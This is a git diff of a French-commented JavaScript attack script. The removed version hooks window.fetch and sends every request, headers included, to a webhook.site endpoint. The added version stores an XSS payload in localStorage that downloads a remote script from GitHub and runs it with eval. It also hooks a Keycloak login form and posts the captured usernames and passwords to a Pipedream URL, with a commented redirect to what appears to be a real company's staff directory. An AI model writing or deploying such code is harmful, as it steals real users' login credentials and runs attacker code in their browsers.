@@ -1,26 +1,25 @@
-// On sauvegarde l'original de fetch
-const originalFetch = window.fetch;
+// 1. Persistance dans localStorage pour RememberMe XSS
+localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/newpayload.js').then(r=>r.text()).then(c=>eval(c))">`);
 
-window.fetch = async function(...args) {
-    const response = await originalFetch.apply(this, args);
+// 2. Hook du formulaire d'authentification
+var loginForm = document.getElementById('kc-form-login');
+if (loginForm) {
+  loginForm.addEventListener('submit', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
 
-    // Copie la requête que tu viens de faire
-    const [resource, config] = args;
-
-    const logData = {
-        resource: resource,
-        method: config?.method || 'GET',
-        headers: config?.headers || {},
-        body: config?.body || null,
+    // 3. Exfiltration vers Pipedream
+    fetch('https://eojy4h95a631zv3.m.pipedream.net', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        username: username,
+        password: password,
         timestamp: new Date().toISOString()
-    };
-
-    // On l'envoie vers le webhook
-    fetch("https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(logData)
+      })
     });
 
-    return response;
-};
+    // 4. (Optionnel) Redirection après exfiltration
+    // window.location.href = 'https://trombinoscopemousquetaires.mousquetaires.com/trombinoscope-mousquetaires/';
+  });
+}
